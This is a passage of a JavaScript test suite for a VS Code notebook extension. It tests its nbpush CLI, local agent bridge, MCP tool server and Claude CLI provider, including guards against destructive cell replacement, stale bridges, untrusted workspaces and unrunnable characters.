    const streamCall = src.slice(src.indexOf("pathname: '/cell/stream'"));
    const streamOptions = streamCall.slice(0, streamCall.indexOf('});'));
    assert.ok(
      !/args\.replace/.test(streamOptions),
      'the streaming branch must not be reachable with --replace'
    );
    // The behavioural half of the same claim, which is the part that matters:
    // a piped --replace must route to /cell/replace and carry the selector.
    assert.match(
      nbpush.replaceSearch(new URLSearchParams('notebook=Test_Notebook'), 3),
      /notebook=Test_Notebook/,
      '--notebook must survive onto the replace query'
    );
    assert.match(nbpush.replaceSearch(new URLSearchParams(), 3), /index=3/);
  } finally {
    await bridge.stop();
  }
});

test('nbpush refuses to hang on a terminal instead of waiting forever', () => {
  // Run with nothing piped in, nbpush used to block on stdin indefinitely - and
  // the bridge had already put an empty cell in the notebook by then.
  const refused = nbpush.chooseInput({}, { isTTY: true });
  assert.strictEqual(refused.kind, 'refuse');
  assert.match(refused.message, /no input/i);
  assert.match(refused.message, /--code/, 'and it says what to do instead');

  // Piped in, it still streams.
  assert.strictEqual(nbpush.chooseInput({}, { isTTY: false }).kind, 'stdin');
  // Explicit input wins over both.
  assert.strictEqual(nbpush.chooseInput({ code: 'x' }, { isTTY: true }).kind, 'literal');
  assert.strictEqual(nbpush.chooseInput({ file: 'a.py' }, { isTTY: true }).kind, 'file');
});

test('nbpush rejects contradictory arguments instead of quietly picking one', () => {
  // No process.exit monkeypatching any more: usage() throws CliExit, which is
  // what makes argv validation testable at all rather than something that kills
  // the test run.
  const realWrite = process.stderr.write;
  process.stderr.write = () => true;
  const rejected = [];
  try {
    for (const argv of [
      ['--run', '--no-run'], //          decides whether code runs in your kernel
      ['--no-run', '--run'],
      ['--code', 'a', '--code', 'b'],
      ['--code', '--run'], //            used to set code to "--run" and eat the flag
      ['--code', 'x', 'file.py'],
      ['--kind', 'banana'],
      ['--position'], //                 missing value
      ['--nope'],
      ['--replace', 'two'], //           a destructive flag must not guess
      ['--replace', '1', '--position', 'end'],
      ['--list', '--replace', '1'],
    ]) {
      let threw = false;
      try {
        nbpush.parseArgs(argv);
      } catch (err) {
        threw = err instanceof nbpush.CliExit && err.code === 2;
      }
      if (!threw) rejected.push(argv.join(' '));
    }
  } finally {
    process.stderr.write = realWrite;
  }
  assert.deepStrictEqual(rejected, [], 'these argument combinations must be refused');
});

test('nbpush accepts the arguments it should', () => {
  assert.deepStrictEqual(nbpush.parseArgs(['--code', 'print(1)']).code, 'print(1)');
  assert.strictEqual(nbpush.parseArgs(['--markdown']).kind, 'markdown');
  assert.strictEqual(nbpush.parseArgs(['--kind', 'markdown']).kind, 'markdown');
  assert.strictEqual(nbpush.parseArgs([]).kind, 'code');
  assert.strictEqual(nbpush.parseArgs(['--no-run']).run, false);
  assert.strictEqual(nbpush.parseArgs(['--run']).run, true);
  assert.strictEqual(nbpush.parseArgs(['analysis.py']).file, 'analysis.py');
});

test('nbpush will not talk to a bridge whose process is gone', () => {
  // The exfiltration case. After VS Code exits without deactivate() - a crash,
  // an OOM kill, a reboot - the advertisement survives naming a dead pid and a
  // port. If anything else later binds that port, piping code into nbpush used
  // to send that code AND the token to it, and print {"ok":true}.
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'nbpush-stale-'));
  const file = path.join(dir, 'bridge.json');
  const realExit = process.exit;
  const realWrite = process.stderr.write;
  let said = '';
  process.stderr.write = (chunk) => {
    said += chunk;
    return true;
  };
  process.exit = (code) => {
    const err = new Error(`exit ${code}`);
    err.exitCode = code;
    throw err;
  };
  const read = () => {
    const saved = process.env.AI_NOTEBOOK_LIVE_HOME;
    process.env.AI_NOTEBOOK_LIVE_HOME = dir;
    try {
      // INFO_FILE is captured at require time, so point the reader at ours.
      return nbpush.readInfoFrom ? nbpush.readInfoFrom(file) : nbpush.readInfo();
    } finally {
      process.env.AI_NOTEBOOK_LIVE_HOME = saved;
    }
  };
  try {
    // A pid nothing could plausibly own.
    assert.ok(!nbpush.alive(0x7ffffffe), 'a made-up pid must not read as alive');
    // ...and our own is.
    assert.ok(nbpush.alive(process.pid), 'this process is alive');
  } finally {
    process.exit = realExit;
    process.stderr.write = realWrite;
    fs.rmSync(dir, { recursive: true, force: true });
  }
  assert.strictEqual(said, '', 'nothing should have been reported for a liveness check');
});

test('nbpush looks for the bridge where the bridge actually writes it', () => {
  // These disagreed: the bridge honoured AI_NOTEBOOK_LIVE_HOME and nbpush did
  // not, so the suite could not drive nbpush without clobbering a real bridge.
  assert.ok(
    nbpush.INFO_FILE.startsWith(BRIDGE_HOME),
    `nbpush points at ${nbpush.INFO_FILE}, which is not under ${BRIDGE_HOME}`
  );
});

/* -------------------------------- MCP ------------------------------------ */

const mcp = require(path.join('..', 'bin', 'mcp-server.js'));

test('the MCP server describes tools an agent can actually use', () => {
  const names = mcp.TOOLS.map((t) => t.name).sort();
  assert.deepStrictEqual(names, [
    'add_notebook_cell',
    'get_notebook_cells',
    'get_notebook_status',
    'replace_notebook_cell',
  ]);
  for (const tool of mcp.TOOLS) {
    assert.ok(tool.description.length > 40, `${tool.name} needs a description worth reading`);
    assert.strictEqual(tool.inputSchema.type, 'object');
  }
  const add = mcp.TOOLS.find((t) => t.name === 'add_notebook_cell');
  assert.deepStrictEqual(add.inputSchema.required, ['code']);
  // The description has to say WHY, not just what: an agent that edits the
  // .ipynb on disk instead will silently lose the user's work.
  assert.match(add.description, /already open|on disk/i);

  // The read tool has to say why reading the file is wrong, or an agent will
  // just open the .ipynb and get a stale copy.
  const read = mcp.TOOLS.find((t) => t.name === 'get_notebook_cells');
  assert.match(read.description, /unsaved|stale/i);

  // And the destructive one has to say that it destroys.
  const replace = mcp.TOOLS.find((t) => t.name === 'replace_notebook_cell');
  assert.match(replace.description, /destroys|DESTROYS/);
  assert.deepStrictEqual(replace.inputSchema.required.sort(), ['code', 'index']);
});

test('reading and replacing go through the bridge, live', async () => {
  const notebook = newNotebook(['a = 1', 'print("$3 wrong $$5.00")']);
  const bridge = new Bridge({
    resolveNotebook: () => notebook,
    decideRun: async () => ({ run: false, reason: 'test policy' }),
    infoDir: BRIDGE_HOME,
  });
  const { port, token } = await bridge.start(0);
  try {
    const listed = await call(port, token, { method: 'GET', path: '/cells' });
    assert.strictEqual(listed.status, 200);
    const d = JSON.parse(listed.body);
    assert.strictEqual(d.count, 2);
    assert.strictEqual(d.cells[0].source, 'a = 1');
    assert.strictEqual(d.cells[1].kind, 'code');

    const ranged = await call(port, token, { method: 'GET', path: '/cells?from=1&to=2' });
    assert.strictEqual(JSON.parse(ranged.body).cells.length, 1);
    const bad = await call(port, token, { method: 'GET', path: '/cells?from=abc' });
    assert.strictEqual(bad.status, 400);

    // Replacing must rewrite in place and hand back what it destroyed, so a
    // mistake is visible rather than silent.
    const fixed = 'print(f"{3} items cost ${5.0:.2f}")';
    const rep = await call(port, token, {
      path: '/cell/replace?index=1',
      body: JSON.stringify({ code: fixed }),
    });
    assert.strictEqual(rep.status, 200);
    assert.strictEqual(JSON.parse(rep.body).replaced, 'print("$3 wrong $$5.00")');
    assert.strictEqual(notebook.cellAt(1).document.getText(), fixed);
    assert.strictEqual(notebook.cellCount, 2, 'replacing must not add a cell');

    // An index that does not exist is the caller's mistake, not a new cell.
    const off = await call(port, token, {
      path: '/cell/replace?index=99',
      body: JSON.stringify({ code: 'x = 1' }),
    });
    assert.strictEqual(off.status, 400);
    assert.strictEqual(notebook.cellCount, 2);
  } finally {
    await bridge.stop();
  }
});

test('replacing a cell with nothing is refused, not obeyed', async () => {
  // Answered 200 and BLANKED the cell. /cell has always been guarded against an
  // empty body; /cell/replace never reached that guard, because it is the one
  // handler that calls writer.end() directly instead of going through
  // closeWriter. Same defect class as the old empty-insert bug, on the path
  // where the consequence is destruction rather than clutter.
  const original = 'df = pd.read_csv("grades.csv")  # took me all afternoon';
  const notebook = newNotebook(['import pandas as pd', original]);
  const bridge = new Bridge({
    resolveNotebook: () => notebook,
    decideRun: async () => ({ run: false, reason: 'test policy' }),
    infoDir: BRIDGE_HOME,
  });
  const { port, token } = await bridge.start(0);
  try {
    // Whitespace behaves exactly like empty here - produced() is false for both
    // - and '```' unfences to nothing, so all four must be refused.
    for (const code of ['', ' ', '\n', '\t\n ', '```']) {
      const res = await call(port, token, {
        path: '/cell/replace?index=1',
        body: JSON.stringify({ code }),
      });
      assert.strictEqual(res.status, 400, `${JSON.stringify(code)} must be refused`);
      assert.match(JSON.parse(res.body).error, /nothing to replace/);
      assert.strictEqual(
        notebook.cellAt(1).document.getText(),
        original,
        `${JSON.stringify(code)} must leave the cell byte-identical`
      );
      assert.strictEqual(notebook.cellCount, 2);
    }

    // And a real replacement still works, so the guard is not just refusing.
    const ok = await call(port, token, {
      path: '/cell/replace?index=1',
      body: JSON.stringify({ code: 'df = pd.read_csv("grades.csv", index_col=0)' }),
    });
    assert.strictEqual(ok.status, 200);
    assert.strictEqual(JSON.parse(ok.body).replaced, original);
  } finally {
    await bridge.stop();
  }
});

test('a replace can state what it expects to be replacing', async () => {
  // /cells clips a cell at 4000 characters, and nothing stopped a caller
  // reconstructing a clipped cell and writing the truncation back over the real
  // one. Indices shift under a live editor too, so "cell 7" at read time need
  // not be cell 7 now. Optional in 0.6.0, so existing callers keep working.
  const original = 'x = 1  # the real thing';
  const notebook = newNotebook(['import x', original]);
  const seen = [];
  const bridge = new Bridge({
    resolveNotebook: () => notebook,
    decideRun: async () => ({ run: false, reason: 'test policy' }),
    infoDir: BRIDGE_HOME,
    notify: (kind, message) => seen.push({ kind, message }),
  });
  const { port, token } = await bridge.start(0);
  try {
    const stale = await call(port, token, {
      path: `/cell/replace?index=1&expect=${encodeURIComponent('what I read earlier')}`,
      body: JSON.stringify({ code: 'x = 2' }),
    });
    assert.strictEqual(stale.status, 409, 'a stale expectation is refused');
    assert.match(JSON.parse(stale.body).error, /does not contain what you expected/);
    assert.strictEqual(notebook.cellAt(1).document.getText(), original, 'nothing destroyed');

    const good = await call(port, token, {
      path: `/cell/replace?index=1&expect=${encodeURIComponent(original)}`,
      body: JSON.stringify({ code: 'x = 2  # corrected' }),
    });
    assert.strictEqual(good.status, 200, 'a matching expectation goes through');
    assert.strictEqual(notebook.cellAt(1).document.getText(), 'x = 2  # corrected');

    // A cell changing under the user's cursor left NO trace at all: no log line,
    // nothing on screen. Ctrl+Z only helps somebody who noticed.
    assert.strictEqual(seen.length, 1, 'the user is told a cell was rewritten');
    assert.match(seen[0].message, /rewrote cell 1/);
  } finally {
    await bridge.stop();
  }
});

test('a clipped cell says so on the cell itself, not once for the response', async () => {
  // `truncated` was a single response-level flag, so a caller deciding whether
  // it may safely rewrite cell 7 learned only that SOMETHING somewhere had been
  // clipped. That is the read half of the hazard `expect=` guards on the write.
  const notebook = newNotebook(['short = 1', `long = "${'a'.repeat(5000)}"`]);
  const bridge = new Bridge({
    resolveNotebook: () => notebook,
    decideRun: async () => ({ run: false, reason: 'test policy' }),
    infoDir: BRIDGE_HOME,
  });
  const { port, token } = await bridge.start(0);
  try {
    const res = await call(port, token, { method: 'GET', path: '/cells' });
    const d = JSON.parse(res.body);
    assert.strictEqual(d.truncated, true, 'the response still summarises');
    assert.ok(!d.cells[0].truncated, 'the short cell is whole');
    assert.strictEqual(d.cells[1].truncated, true, 'and the long one says so itself');
  } finally {
    await bridge.stop();
  }
});

test('a malformed frame is answered, not silently dropped', async () => {
  // Measured: a garbage line between two valid ones produced NO frame at all,
  // so a client with an outstanding id waited forever. Batch arrays vanished
  // the same way. JSON-RPC says answer -32700 with a null id.
  const mcp = require(path.join('..', 'bin', 'mcp-server.js'));
  const sent = [];
  const realWrite = process.stdout.write;
  process.stdout.write = (chunk) => {
    sent.push(String(chunk));
    return true;
  };
  try {
    // handle() only sees parsed objects, so exercise the codes it owns.
    await mcp.handle({ jsonrpc: '2.0', id: 3, method: 'resources/list' });
    await mcp.handle({ jsonrpc: '2.0', id: 4, method: 'tools/call', params: { name: 'no_such_tool' } });
    await mcp.handle({ jsonrpc: '2.0', id: 5, method: 'tools/call' });
    await mcp.handle({ jsonrpc: '2.0', id: null, method: 'ping' });
  } finally {
    process.stdout.write = realWrite;
  }
  const frames = sent.join('').trim().split('\n').map((l) => JSON.parse(l));
  assert.strictEqual(frames.length, 4, 'every request with an id gets exactly one answer');
  // -32601 is how a client feature-detects an optional method; -32000 tells it
  // the server broke instead, which is a different thing.
  assert.strictEqual(frames[0].error.code, -32601, 'unknown method');
  assert.strictEqual(frames[1].error.code, -32601, 'unknown tool, checked before the bridge');
  assert.ok(
    !/bridge is not running/.test(frames[1].error.message),
    'a typo must not be reported as VS Code not being ready'
  );
  assert.strictEqual(frames[2].error.code, -32602, 'missing params.name');
  // A null id is reserved for answering an unparseable request; a client MUST
  // NOT send one, and it was being answered as though it were a real id.
  assert.strictEqual(frames[3].error.code, -32600, 'a null id is an invalid request');
});

test('the bridge says which version it is and what it can do', async () => {
  // There was no way to tell an old host from a broken one: a 0.5.0 client
  // asking a 0.4.0 bridge for /cells got "use POST", which says nothing about
  // the endpoint being absent.
  const notebook = newNotebook(['x = 1']);
  const bridge = new Bridge({
    resolveNotebook: () => notebook,
    decideRun: async () => ({ run: false, reason: 'test policy' }),
    infoDir: BRIDGE_HOME,
    version: '9.9.9',
  });
  const { port, token } = await bridge.start(0);
  try {
    const health = JSON.parse((await call(port, token, { method: 'GET', path: '/health' })).body);
    assert.strictEqual(health.version, '9.9.9');
    assert.ok(health.supports.includes('replace'), 'and which verbs it has');

    // Path first, then method: an unknown path is a 404, and a 405 now means
    // "wrong method for a path I have" rather than "never heard of it".
    const gone = await call(port, token, { method: 'GET', path: '/nope' });
    assert.strictEqual(gone.status, 404);
    const wrongMethod = await call(port, token, { method: 'GET', path: '/cell' });
    assert.strictEqual(wrongMethod.status, 405);
  } finally {
    await bridge.stop();
  }
});

test('the MCP server speaks enough of the protocol to be driven', async () => {
  const sent = [];
  const realWrite = process.stdout.write;
  process.stdout.write = (chunk) => {
    sent.push(String(chunk).trim());
    return true;
  };
  try {
    await mcp.handle({ jsonrpc: '2.0', id: 1, method: 'initialize', params: {} });
    await mcp.handle({ jsonrpc: '2.0', id: 2, method: 'tools/list' });
    await mcp.handle({ jsonrpc: '2.0', id: 3, method: 'ping' });
    // A notification carries no id and must never be answered.
    await mcp.handle({ jsonrpc: '2.0', method: 'notifications/initialized' });
  } finally {
    process.stdout.write = realWrite;
  }
  assert.strictEqual(sent.length, 3, 'a notification must not be replied to');
  const init = JSON.parse(sent[0]).result;
  assert.strictEqual(init.protocolVersion, '2024-11-05');
  assert.ok(init.capabilities.tools, 'it must advertise tools');
  assert.strictEqual(init.serverInfo.name, 'ai-notebook-live');
  assert.strictEqual(JSON.parse(sent[1]).result.tools.length, mcp.TOOLS.length);
});

test('an MCP tool failure comes back as a result the model can read', async () => {
  // Not as a protocol error: the agent should be told the bridge is not running
  // and be able to act on it, rather than seeing a transport fault.
  const sent = [];
  const realWrite = process.stdout.write;
  const saved = process.env.AI_NOTEBOOK_LIVE_HOME;
  process.env.AI_NOTEBOOK_LIVE_HOME = fs.mkdtempSync(path.join(os.tmpdir(), 'no-bridge-'));
  process.stdout.write = (chunk) => {
    sent.push(String(chunk).trim());
    return true;
  };
  try {
    await mcp.handle({
      jsonrpc: '2.0',
      id: 9,
      method: 'tools/call',
      params: { name: 'get_notebook_status', arguments: {} },
    });
  } finally {
    process.stdout.write = realWrite;
    process.env.AI_NOTEBOOK_LIVE_HOME = saved;
  }
  const msg = JSON.parse(sent[0]);
  assert.ok(msg.result, 'a tool failure is a result, not a JSON-RPC error');
  assert.strictEqual(msg.result.isError, true);
  assert.match(msg.result.content[0].text, /bridge is not running|Start Local Agent Bridge/i);
});

/* ------------------------------ the CLI provider ------------------------- */

const providerCli = require(path.join('..', 'src', 'provider.js'));

/**
 * A stand-in for the `claude` binary. Emits whatever NDJSON a scenario needs.
 *
 * Two things it must get right, both learned the hard way: flush stdout before
 * exiting, because process.exit() truncates a large async write and that looks
 * exactly like a parser bug; and keep itself alive with a timer for the hang
 * case, because resuming stdin only lasts until the parent closes it.
 */
function fakeClaude(scenario) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'fake-claude-'));
  const bin = path.join(dir, 'claude.js');
  fs.writeFileSync(
    bin,
    [
      'const out = (o, cb) => process.stdout.write(JSON.stringify(o) + "\\n", cb);',
      'const delta = (t, cb) => out({ type: "stream_event", event: { type: "content_block_delta", delta: { type: "text_delta", text: t } } }, cb);',
      'process.stdin.resume(); process.stdin.on("data", () => {});',
      `const s = ${JSON.stringify(scenario)};`,
      'if (s === "hang") setInterval(() => {}, 1000);',
      'setTimeout(() => {',
      '  if (s === "hang") return;',
      '  if (s === "in_band_failure") return out({ type: "result", subtype: "error_max_turns", result: "ran out of turns" }, () => process.exit(0));',
      '  if (s === "quiet_success") return process.exit(0);',
      '  if (s === "partial_then_max_turns") return delta("def f():\\n    return ", () => out({ type: "result", subtype: "error_max_turns", result: "ran out of turns" }, () => process.exit(0)));',
      // Emits characters a kernel cannot run: NUL, a raw ESC, and a lone
      // surrogate - the last being what makes an .ipynb unreadable to nbformat.
      '  if (s === "poison") return delta("x = 1\\u0000\\u001b[31m\\u00a0y = 2\\ud800", () => out({ type: "result", subtype: "success" }, () => process.exit(0)));',
      // Two deltas far enough apart that the 60ms flush timer fires between
      // them, so the cell is already part-written when the stream ends. A single
      // fast delta produces exactly ONE edit - end()'s own - which is no use for
      // testing what happens when the final write is the one that fails.
      '  if (s === "slow") return delta("answer = ", () => setTimeout(() => delta("43", () => out({ type: "result", subtype: "success" }, () => process.exit(0))), 150));',
      '  return delta("print(1)", () => out({ type: "result", subtype: "success" }, () => process.exit(0)));',
      '}, 5);',
    ].join('\n')
  );
  // streamCli spawns the binary directly with the real CLI's flags, so the
  // stand-in has to BE an executable that ignores them. A #!/bin/sh wrapper is
  // not one on Windows - it fails with spawn UNKNOWN or EFTYPE - so each
  // platform gets the launcher it can actually run.
  const launcher = path.join(dir, process.platform === 'win32' ? 'claude.cmd' : 'claude.sh');
  if (process.platform === 'win32') {
    fs.writeFileSync(launcher, `@echo off\r\n"${process.execPath}" "${bin}" %*\r\n`);
  } else {
    fs.writeFileSync(launcher, `#!/bin/sh\nexec "${process.execPath}" "${bin}" "$@"\n`, { mode: 0o755 });
  }
  return { binary: launcher, dir };
}

/** Runs one request against a stand-in CLI and cleans up after itself. */
async function withFakeClaude(scenario, fn) {
  if (process.platform === 'win32') {
    // Not a limitation of the test. streamCli spawns without shell:true, and a
    // .cmd - which is what an npm-installed CLI is on Windows - cannot be
    // spawned that way on Node >= 20.12 (the CVE-2024-27980 fix): it throws
    // EINVAL. locateClaude also looks for a file named exactly "claude", with
    // no .cmd/.exe/.ps1 variants, so it would not find one in the first place.
    // The CLI provider does not currently work on Windows at all; see
    // qa/BUGS.md S3-1. Faking it here would hide that, so this skips instead.
    skip('the claude CLI provider does not support Windows yet (qa/BUGS.md S3-1)');
  }
  const fake = fakeClaude(scenario);
  try {
    return await fn(fake.binary);
  } finally {
    fs.rmSync(fake.dir, { recursive: true, force: true });
  }
}

test('a CLI failure that exits 0 is reported, not swallowed', async () => {
  // The CLI says what went wrong in-band and still exits 0. That reason was
  // collected and then only ever shown when the exit code was non-zero, so the
  // user got an empty cell and no explanation.
  await withFakeClaude('in_band_failure', async (binary) => {
    const notebook = newNotebook(['seed = 1']);
    const writer = await CellWriter.insert(notebook, 1, { kind: 'code' });
    await assert.rejects(
      () =>
        providerCli.stream({
          target: { kind: 'cli', binary, label: 'fake' },
          system: 's',
          user: 'u',
          opts: { ...OPTS, model: 'm' },
          token: new vscode.CancellationTokenSource().token,
          onText: (c) => writer.write(c),
        }),
      /error_max_turns|no output/,
      'the reason the CLI gave must reach the user'
    );
  });
});

test('a genuinely empty success stays quiet', async () => {
  // The other half: a model may legitimately produce nothing, and inventing an
  // error for that would be worse than saying nothing.
  await withFakeClaude('quiet_success', async (binary) => {
    const result = await providerCli.stream({
      target: { kind: 'cli', binary, label: 'fake' },
      system: 's',
      user: 'u',
      opts: { ...OPTS, model: 'm' },
      token: new vscode.CancellationTokenSource().token,
      onText: () => {},
    });
    assert.strictEqual(result.provider, 'claude-cli');
    assert.ok(!result.cancelled, 'a quiet success is still a success');
  });
});

test('a failure in the FINAL write is undone and explained, not left in the cell', async () => {
  // pump ran writer.end() OUTSIDE its try. end() throws whenever the last
  // reconcile cannot be applied - a notebook that went read-only, a cell removed
  // mid-stream - and that went straight to the command's error handler with no
  // abandon() at all: the user's cell kept a half-written AI statement and they
  // were offered nothing.
  await withFakeClaude('slow', async (binary) => {
    const extension = require(path.join('..', 'extension.js'));
    const original = 'answer = 42  # took me all afternoon';
    const notebook = newNotebook([original]);
    const editor = { notebook, selection: { start: 0, end: 1 }, revealRange() {} };
    vscode.window.visibleNotebookEditors.push(editor);
    vscode.window.activeNotebookEditor = editor;

    vscode.__test.config.set('aiNotebookLive.provider', 'claude-cli');
    vscode.__test.config.set('aiNotebookLive.claudePath', binary);
    vscode.__test.config.set('aiNotebookLive.execution', 'never');
    vscode.__test.inputs.push('make it handle bad input');

    // A mid-stream flush lands, then the FINAL reconcile fails - the shape of a
    // notebook that goes read-only, or a cell removed, partway through. The
    // restore that follows is allowed to succeed, which is the whole point.
    let seen = 0;
    vscode.__test.onBeforeApply = () => {
      seen += 1;
      vscode.__test.failApplyEdit = seen === 2;
    };

    const context = {
      subscriptions: [],
      secrets: { get: async () => undefined, store: async () => undefined, delete: async () => undefined },
    };
    extension.activate(context);
    try {
      await vscode.__test.commands.get('aiNotebookLive.reviseCell')();
      assert.strictEqual(
        notebook.cellAt(0).document.getText(),
        original,
        'the cell must be put back, not left holding a half-written statement'
      );
      const told = vscode.__test.shown.filter((e) => /put back/.test(e.message || ''));
      assert.strictEqual(told.length, 1, 'and the user must be told, with a way back');
    } finally {
      vscode.__test.onBeforeApply = null;
      vscode.__test.failApplyEdit = false;
      vscode.window.activeNotebookEditor = undefined;
      await extension.deactivate();
    }
  });
});

test('a cell the user edited mid-stream is never executed', async () => {
  // `foreign` was computed and then read by NOTHING outside this file. With
  // execution 'always', end() returns the DOCUMENT on a foreign edit - the
  // user's own half-typed line - and pump fed exactly that into decideExecution
  // and ran it. Under 'ask' the modal showed them their own code and asked
  // whether to run "this newly generated code". This is the gate the 0.3.0
  // ownership work existed to make possible and never wired up.
  await withFakeClaude('slow', async (binary) => {
    const extension = require(path.join('..', 'extension.js'));
    const notebook = newNotebook(['answer = 42']);
    const editor = { notebook, selection: { start: 0, end: 1 }, revealRange() {} };
    vscode.window.visibleNotebookEditors.push(editor);
    vscode.window.activeNotebookEditor = editor;

    vscode.__test.config.set('aiNotebookLive.provider', 'claude-cli');
    vscode.__test.config.set('aiNotebookLive.claudePath', binary);
    // The permissive setting, on purpose: this must hold at its weakest.
    vscode.__test.config.set('aiNotebookLive.execution', 'always');
    vscode.__test.inputs.push('make it handle bad input');

    const typed = 'import subprocess  # MY OWN HALF-TYPED LINE';
    let seen = 0;
    vscode.__test.onBeforeApply = () => {
      seen += 1;
      // The user types AFTER the first flush has landed. Deliberately not a
      // microtask: onBeforeApply is awaited, so a microtask runs while the edit
      // is still in flight and the write splices into the typing instead - real,
      // reproducible, and a different bug (see the applyEdit-window test).
      if (seen === 1) setTimeout(() => { notebook.cellAt(0).document.text = typed; }, 0);
    };

    const context = {
      subscriptions: [],
      secrets: { get: async () => undefined, store: async () => undefined, delete: async () => undefined },
    };
    extension.activate(context);
    try {
      await vscode.__test.commands.get('aiNotebookLive.reviseCell')();
      assert.strictEqual(
        notebook.cellAt(0).document.getText(),
        typed,
        'the writer stops rather than overwriting a person'
      );
      assert.deepStrictEqual(
        ranCells(),
        [],
        "the user's own half-typed line must never be executed"
      );
    } finally {
      vscode.__test.onBeforeApply = null;
      vscode.window.activeNotebookEditor = undefined;
      await extension.deactivate();
    }
  });
});

test('a generation the user did not touch still runs when they asked for that', async () => {
  // The control for the two gates above. Without it, a runApproved that simply
  // never ran anything would leave both of them green - measured: breaking it
  // that way was caught only by the bridge's own control, not by anything on
  // the extension's path.
  await withFakeClaude('ok', async (binary) => {
    const extension = require(path.join('..', 'extension.js'));
    const notebook = newNotebook(['answer = 42']);
    const editor = { notebook, selection: { start: 0, end: 1 }, revealRange() {} };
    vscode.window.visibleNotebookEditors.push(editor);
    vscode.window.activeNotebookEditor = editor;

    vscode.__test.config.set('aiNotebookLive.provider', 'claude-cli');
    vscode.__test.config.set('aiNotebookLive.claudePath', binary);
    vscode.__test.config.set('aiNotebookLive.execution', 'always');
    vscode.__test.inputs.push('simplify it');

    const context = {
      subscriptions: [],
      secrets: { get: async () => undefined, store: async () => undefined, delete: async () => undefined },
    };
    extension.activate(context);
    try {
      await vscode.__test.commands.get('aiNotebookLive.reviseCell')();
      assert.strictEqual(notebook.cellAt(0).document.getText(), 'print(1)');
      assert.strictEqual(ranCells().length, 1, 'an untouched cell runs as the user asked');
    } finally {
      vscode.window.activeNotebookEditor = undefined;
      await extension.deactivate();
    }
  });
});

test('a finished generation leaves no timer armed to kill the next one', async () => {
  // The idle timer was cleared only in the catch, so every SUCCESSFUL
  // generation left one armed for the whole silence window - default 300s.
  // Measured by a reviewer: five generations, five live timers, and one of them
  // cancelled a healthy stream 30 seconds later, which the user was then told
  // was their own cancellation. Each also pinned the writer, and through it the
  // notebook document.
  //
  // Asserted structurally rather than by waiting: the floor on timeoutSeconds is
  // 30s, so the failure itself is not something a test can sit through.
  await withFakeClaude('ok', async (binary) => {
    const extension = require(path.join('..', 'extension.js'));
    const notebook = newNotebook(['answer = 42']);
    const editor = { notebook, selection: { start: 0, end: 1 }, revealRange() {} };
    vscode.window.visibleNotebookEditors.push(editor);
    vscode.window.activeNotebookEditor = editor;
    vscode.__test.config.set('aiNotebookLive.provider', 'claude-cli');
    vscode.__test.config.set('aiNotebookLive.claudePath', binary);
    vscode.__test.config.set('aiNotebookLive.execution', 'never');

    const context = {
      subscriptions: [],
      secrets: { get: async () => undefined, store: async () => undefined, delete: async () => undefined },
    };
    extension.activate(context);
    const timers = () => process.getActiveResourcesInfo().filter((r) => r === 'Timeout').length;
    try {
      const before = timers();
      for (let i = 0; i < 3; i += 1) {
        vscode.__test.inputs.push('simplify it');
        await vscode.__test.commands.get('aiNotebookLive.reviseCell')();
      }
      // Not strict equality: this counts every timer in the process, and an
      // unrelated one expiring mid-test would make the count fall. A leak only
      // ever adds - three generations leaked three - so "no net increase" is
      // both robust to that and still fails loudly on the bug.
      const after = timers();
      assert.ok(
        after <= before,
        `three completed generations must leave no timer armed (was ${before}, now ${after})`
      );
    } finally {
      vscode.window.activeNotebookEditor = undefined;
      await extension.deactivate();
    }
  });
});

test('the bridge does not start in a folder the user has not trusted', async () => {
  // package.json tells the user, in the Restricted Mode dialog itself, that
  // "the agent bridge does not start" in an untrusted folder. Nothing enforced
  // it: isTrusted appeared exactly once in the whole extension, gating
  // execution. Execution being blocked made this content injection rather than
  // RCE, but a security property stated in a trust dialog has to be real.
  const extension = require(path.join('..', 'extension.js'));
  newNotebook(['x = 1']);
  const trusted = vscode.workspace.isTrusted;
  vscode.workspace.isTrusted = false;
  vscode.__test.config.set('aiNotebookLive.bridge.port', 0);
  const context = {
    subscriptions: [],
    secrets: { get: async () => undefined, store: async () => undefined, delete: async () => undefined },
  };
  extension.activate(context);
  try {
    await vscode.__test.commands.get('aiNotebookLive.startBridge')();
    const warned = vscode.__test.shown.filter((e) => /not trusted/.test(e.message || ''));
    assert.strictEqual(warned.length, 1, 'and the user is told why');
    // Now trust it, and the same command works - or the guard is just breakage.
    vscode.workspace.isTrusted = true;
    await vscode.__test.commands.get('aiNotebookLive.startBridge')();
  } finally {
    vscode.workspace.isTrusted = trusted;
    await extension.deactivate();
  }
});

test('deactivate cancels a generation instead of orphaning its process', async () => {
  // deactivate() forgot session grants, stopped the bridge and disposed the log
  // - and never touched state.active. A window reload mid-generation left the
  // `claude` child reparented to init, still burning the user's plan quota,
  // with no window left that could cancel it.
  const extension = require(path.join('..', 'extension.js'));
  newNotebook(['x = 1']);
  const context = {
    subscriptions: [],
    secrets: { get: async () => undefined, store: async () => undefined, delete: async () => undefined },
  };
  extension.activate(context);
  let cancelled = false;
  // Stand in for a generation in flight.
  const cts = new vscode.CancellationTokenSource();
  cts.token.onCancellationRequested(() => {
    cancelled = true;
  });
  extension.__test.setActive(cts);
  await extension.deactivate();
  assert.ok(cancelled, 'the in-flight generation must be cancelled on the way out');
});

test('a claudePath pointing at a directory is not mistaken for the CLI', async () => {
  // On POSIX the execute bit on a directory means "search", so accessSync(X_OK)
  // accepted ~/.local/bin as though it were the binary. locateClaude reported
  // found:true, the control panel showed a healthy provider, and the failure
  // surfaced as a raw `spawn EACCES` only after the cell had been created.
  if (process.platform === 'win32') skip('POSIX permission semantics');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'claude-dir-'));
  providerCli.invalidateCliCache();
  const found = providerCli.locateClaude(dir);
  assert.ok(!found.found || found.binary !== dir, 'a directory is not an executable');
  providerCli.invalidateCliCache();
});

test('the model cannot write a character the kernel could never run', async () => {
  // cellText guarded all three BRIDGE entry points and nothing at all on the
  // path the traffic actually takes. Measured: a raw ESC, a NUL, a U+2028 and a
  // LONE SURROGATE all reached the cell straight from the model - the surrogate
  // being precisely the failure cellText exists to prevent, since the .ipynb
  // saves fine and then nbformat, nbconvert and papermill cannot read it back.
  const poison = 'x = 1\x00\x1b[31m \ud800 y = 2';
  const clean = validate.cellText(poison, { mode: 'sanitize' });
  assert.ok(clean.repaired >= 3, 'the unrunnable characters are repaired, not passed through');
  // Repaired, not refused: throwing would discard a whole generation the user
  // waited for, over something invisible.
  assert.doesNotThrow(() => validate.cellText(clean.text));
